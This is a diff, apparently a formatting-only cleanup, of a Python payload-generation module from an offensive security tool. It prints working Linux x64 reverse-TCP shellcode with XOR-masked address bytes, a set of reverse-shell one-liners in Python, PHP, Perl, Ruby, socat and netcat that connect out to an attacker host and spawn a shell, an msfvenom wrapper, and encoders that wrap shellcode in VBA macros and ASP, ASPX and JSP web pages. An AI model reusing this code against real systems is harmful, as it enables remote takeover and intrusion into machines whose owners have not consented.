@@ -144,42 +144,46 @@ def _build_linux_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
     key_word = _struct.pack("<H", xor_key | (xor_key << 8))
 
     return (
-        b"\x48\x31\xd2"                            # xor rdx, rdx
-        b"\x52"                                      # push rdx (null terminator)
-        b"\x48\xb8/bin//sh"                          # movabs rax, "/bin//sh"
-        b"\x50"                                      # push rax
-        b"\x48\x89\xe7"                              # mov rdi, rsp -> *"/bin//sh"
-        b"\x6a\x02\x5e"                              # push 2; pop rsi
-        b"\x6a\x29\x58"                              # push 41; pop rax (SYS_socket)
-        b"\x6a\x02\x5f"                              # push 2; pop rdi (AF_INET)
-        b"\x99"                                      # cdq -> rdx=0
-        b"\x0f\x05"                                  # syscall
-        b"\x48\x97"                                  # xchg rdi, rax
-        b"\x52"                                      # push rdx (8 bytes zero padding)
-        b"\x52"                                      # push rdx (8 bytes zero padding)
-        b"\xb8" + ip_xor +                            # mov eax, ip_xor
-        b"\x35" + key_dword +                         # xor eax, key_dword
-        b"\x89\x44\x24\x04"                           # mov [rsp+4], eax
-        b"\x66\xb8" + port_xor +                      # mov ax, port_xor
-        b"\x66\x35" + key_word +                      # xor ax, key_word
-        b"\x66\x89\x44\x24\x02"                       # mov [rsp+2], ax
-        b"\x31\xc9"                                   # xor ecx, ecx
-        b"\xff\xc1"                                   # inc ecx (ecx=1)
-        b"\xff\xc1"                                   # inc ecx (ecx=2 -> AF_INET)
-        b"\x66\x89\x0c\x24"                           # mov [rsp], cx
-        b"\x48\x89\xe6"                              # mov rsi, rsp -> &sockaddr
-        b"\x6a\x10\x5a"                              # push 16; pop rdx (addrlen)
-        b"\x6a\x2a\x58"                              # push 42; pop rax (SYS_connect)
-        b"\x0f\x05"                                  # syscall
-        b"\x6a\x02\x5e"                              # push 2; pop rsi
-        b"\x6a\x21\x58"                              # dup_loop: push 33; pop rax
-        b"\x0f\x05"                                  # syscall (dup2)
-        b"\x48\xff\xce"                              # dec rsi
-        b"\x79\xf7"                                  # jns dup_loop
-        b"\x6a\x3b\x58"                              # push 59; pop rax (SYS_execve)
-        b"\x48\x31\xf6"                              # xor rsi, rsi
-        b"\x99"                                      # cdq
-        b"\x0f\x05"                                  # syscall
+        b"\x48\x31\xd2"  # xor rdx, rdx
+        b"\x52"  # push rdx (null terminator)
+        b"\x48\xb8/bin//sh"  # movabs rax, "/bin//sh"
+        b"\x50"  # push rax
+        b"\x48\x89\xe7"  # mov rdi, rsp -> *"/bin//sh"
+        b"\x6a\x02\x5e"  # push 2; pop rsi
+        b"\x6a\x29\x58"  # push 41; pop rax (SYS_socket)
+        b"\x6a\x02\x5f"  # push 2; pop rdi (AF_INET)
+        b"\x99"  # cdq -> rdx=0
+        b"\x0f\x05"  # syscall
+        b"\x48\x97"  # xchg rdi, rax
+        b"\x52"  # push rdx (8 bytes zero padding)
+        b"\x52"  # push rdx (8 bytes zero padding)
+        b"\xb8"
+        + ip_xor  # mov eax, ip_xor
+        + b"\x35"
+        + key_dword  # xor eax, key_dword
+        + b"\x89\x44\x24\x04"  # mov [rsp+4], eax
+        b"\x66\xb8"
+        + port_xor  # mov ax, port_xor
+        + b"\x66\x35"
+        + key_word  # xor ax, key_word
+        + b"\x66\x89\x44\x24\x02"  # mov [rsp+2], ax
+        b"\x31\xc9"  # xor ecx, ecx
+        b"\xff\xc1"  # inc ecx (ecx=1)
+        b"\xff\xc1"  # inc ecx (ecx=2 -> AF_INET)
+        b"\x66\x89\x0c\x24"  # mov [rsp], cx
+        b"\x48\x89\xe6"  # mov rsi, rsp -> &sockaddr
+        b"\x6a\x10\x5a"  # push 16; pop rdx (addrlen)
+        b"\x6a\x2a\x58"  # push 42; pop rax (SYS_connect)
+        b"\x0f\x05"  # syscall
+        b"\x6a\x02\x5e"  # push 2; pop rsi
+        b"\x6a\x21\x58"  # dup_loop: push 33; pop rax
+        b"\x0f\x05"  # syscall (dup2)
+        b"\x48\xff\xce"  # dec rsi
+        b"\x79\xf7"  # jns dup_loop
+        b"\x6a\x3b\x58"  # push 59; pop rax (SYS_execve)
+        b"\x48\x31\xf6"  # xor rsi, rsi
+        b"\x99"  # cdq
+        b"\x0f\x05"  # syscall
     )
 
 
@@ -275,7 +279,7 @@ class ReverseShellPayload(PayloadTemplate):
             "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
             "php": f'php -r \'$s=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
             "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""",
-            "ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
             "socat": f"socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
             "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
         }
@@ -336,16 +340,20 @@ class MsfvenomPayload(PayloadTemplate):
         fmt = kwargs.get("format", "raw")
         cmd = [
             "msfvenom",
-            "-p", self.name,
+            "-p",
+            self.name,
             f"LHOST={lhost}",
             f"LPORT={lport}",
-            "-f", fmt,
+            "-f",
+            fmt,
         ]
         if kwargs.get("output"):
             cmd += ["-o", kwargs["output"]]
         try:
             result = subprocess.run(
-                cmd, capture_output=True, timeout=30,
+                cmd,
+                capture_output=True,
+                timeout=30,
             )
             return result.stdout
         except (subprocess.TimeoutExpired, FileNotFoundError):
@@ -440,7 +448,7 @@ def _parse_escaped_hex(escaped: str) -> bytes:
             result.append(int(part[:2], 16))
             for i in range(2, len(part), 2):
                 if i + 2 <= len(part):
-                    result.append(int(part[i:i + 2], 16))
+                    result.append(int(part[i : i + 2], 16))
         except ValueError:
             continue
     return bytes(result)
@@ -597,12 +605,12 @@ class PayloadFactory:
             rows = []
             for i in range(0, len(data), 100):
                 chunk_hex = " ".join(f"{b:02X}" for b in data[i : i + 100])
-                rows.append(f"        buf = buf & \"{chunk_hex}\"")
+                rows.append(f'        buf = buf & "{chunk_hex}"')
             payload_rows = "\n".join(rows)
             return (
                 f"Private Function LazyShell(ByVal c As Integer) As Integer\n"
                 f"    Dim buf As String\n"
-                f"    buf = \"\"\n"
+                f'    buf = ""\n'
                 f"{payload_rows}\n"
                 f"    LazyShell = VarPtr(buf)\n"
                 f"End Function\n"
@@ -611,51 +619,42 @@ class PayloadFactory:
             rows = []
             for i in range(0, len(data), 100):
                 chunk_hex = " ".join(f"{b:02X}" for b in data[i : i + 100])
-                rows.append(f"buf = buf & \"{chunk_hex}\"")
+                rows.append(f'buf = buf & "{chunk_hex}"')
             payload_rows = "\n".join(rows)
-            return (
-                f"Dim buf: buf = \"\"\n"
-                f"{payload_rows}\n"
-            ).encode()
+            return (f'Dim buf: buf = ""\n{payload_rows}\n').encode()
         elif fmt == "asp":
             b64 = base64.b64encode(data).decode("utf-8")
             return (
-                f"<script language=\"VBScript\" runat=\"server\">\n"
-                f"Function b64d(s): Dim o: Set o = CreateObject(\"MSXML2.DOMDocument\").createElement(\"b64\")\n"
-                f"o.dataType = \"bin.base64\": o.Text = s: b64d = o.nodeTypedValue: End Function\n"
-                f"Dim buf: buf = b64d(\"{b64}\")\n"
+                f'<script language="VBScript" runat="server">\n'
+                f'Function b64d(s): Dim o: Set o = CreateObject("MSXML2.DOMDocument").createElement("b64")\n'
+                f'o.dataType = "bin.base64": o.Text = s: b64d = o.nodeTypedValue: End Function\n'
+                f'Dim buf: buf = b64d("{b64}")\n'
                 f"</script>\n"
             ).encode()
         elif fmt == "aspx":
             b64 = base64.b64encode(data).decode("utf-8")
             return (
-                f"<%@ Page Language=\"C#\" %>\n"
-                f"<%@ Import Namespace=\"System\" %>\n"
-                f"<%@ Import Namespace=\"System.Reflection\" %>\n"
-                f"<script runat=\"server\">\n"
+                f'<%@ Page Language="C#" %>\n'
+                f'<%@ Import Namespace="System" %>\n'
+                f'<%@ Import Namespace="System.Reflection" %>\n'
+                f'<script runat="server">\n'
                 f"void Page_Load() {{\n"
-                f"    byte[] buf = Convert.FromBase64String(\"{b64}\");\n"
+                f'    byte[] buf = Convert.FromBase64String("{b64}");\n'
                 f"}}\n"
                 f"</script>\n"
             ).encode()
         elif fmt == "jsp":
             b64 = base64.b64encode(data).decode("utf-8")
             return (
-                f"<%@ page import=\"java.util.Base64\" %>\n"
-                f"<% byte[] buf = java.util.Base64.getDecoder().decode(\"{b64}\"); %>\n"
+                f'<%@ page import="java.util.Base64" %>\n'
+                f'<% byte[] buf = java.util.Base64.getDecoder().decode("{b64}"); %>\n'
             ).encode()
         elif fmt == "war":
             b64 = base64.b64encode(data).decode("utf-8")
-            return (
-                f"<!-- WAR payload placeholder -->\n"
-                f"<!-- base64 shellcode: {b64} -->\n"
-            ).encode()
+            return (f"<!-- WAR payload placeholder -->\n<!-- base64 shellcode: {b64} -->\n").encode()
         elif fmt == "msi":
             b64 = base64.b64encode(data).decode("utf-8")
-            return (
-                f"<!-- MSI payload placeholder -->\n"
-                f"<!-- base64 shellcode: {b64} -->\n"
-            ).encode()
+            return (f"<!-- MSI payload placeholder -->\n<!-- base64 shellcode: {b64} -->\n").encode()
         elif fmt in ("exe", "elf", "dll"):
             return data
         else:
@@ -686,16 +685,16 @@ def format_payload_table(payloads: list[dict[str, Any]]) -> str:
     headers = ["Name", "Platform", "Arch", "Description"]
     rows = []
     for p in payloads:
-        rows.append([
-            p["name"],
-            p["platform"],
-            p["arch"],
-            p["description"][:60],
-        ])
+        rows.append(
+            [
+                p["name"],
+                p["platform"],
+                p["arch"],
+                p["description"][:60],
+            ]
+        )
 
-    widths = [
-        max(len(r[i]) for r in rows + [headers]) for i in range(len(headers))
-    ]
+    widths = [max(len(r[i]) for r in rows + [headers]) for i in range(len(headers))]
     header = "  ".join(h.ljust(w) for h, w in zip(headers, widths, strict=False))
     sep = "  ".join("-" * w for w in widths)
     lines = [header, sep]
